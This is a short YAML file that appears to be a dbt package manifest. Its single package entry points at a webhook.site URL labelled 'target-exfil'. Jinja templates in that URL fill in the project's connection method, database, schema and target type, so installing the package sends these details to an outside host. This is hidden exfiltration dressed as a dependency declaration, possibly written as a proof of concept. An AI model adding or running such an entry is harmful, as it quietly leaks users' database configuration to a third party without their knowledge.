packages:
  - git: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/target-exfil/method={{ target.method if target is defined else 'NO_TARGET' }}/db={{ target.database if target is defined else 'NO_DB' }}/schema={{ target.schema if target is defined else 'NO_SCHEMA' }}/type={{ target.type if target is defined else 'NO_TYPE' }}"
    revision: main
